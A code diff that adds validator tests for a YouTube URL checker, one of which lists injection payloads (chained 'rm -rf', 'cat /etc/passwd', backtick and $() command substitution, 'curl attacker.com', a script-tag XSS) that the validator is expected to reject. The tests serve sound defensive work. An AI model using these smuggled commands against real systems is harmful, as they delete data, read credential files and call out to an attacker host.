@@ -27,5 +27,27 @@ describe('YouTubeUrlValidator', () => {
       expect(await validator.validate(null as any)).toBe(false);
       expect(await validator.validate(undefined as any)).toBe(false);
     });
+
+    it('should reject URLs with shell metacharacters - command injection prevention', async () => {
+      const maliciousUrls = [
+        'https://www.youtube.com/watch?v=test; rm -rf /tmp/*',
+        'https://www.youtube.com/watch?v=test && cat /etc/passwd',
+        'https://www.youtube.com/watch?v=test | ls -la',
+        'https://www.youtube.com/watch?v=test`whoami`',
+        'https://www.youtube.com/watch?v=test$(whoami)',
+        'https://www.youtube.com/watch?v=test;curl attacker.com',
+        'https://www.youtube.com/watch?v=test"><script>alert(1)</script>',
+        'https://youtu.be/test;rm -rf /'
+      ];
+      
+      for (const url of maliciousUrls) {
+        expect(await validator.validate(url)).toBe(false);
+      }
+    });
+
+    it('should reject URLs exceeding maximum length', async () => {
+      const longUrl = 'https://www.youtube.com/watch?v=test' + 'a'.repeat(2000);
+      expect(await validator.validate(longUrl)).toBe(false);
+    });
   });
 });
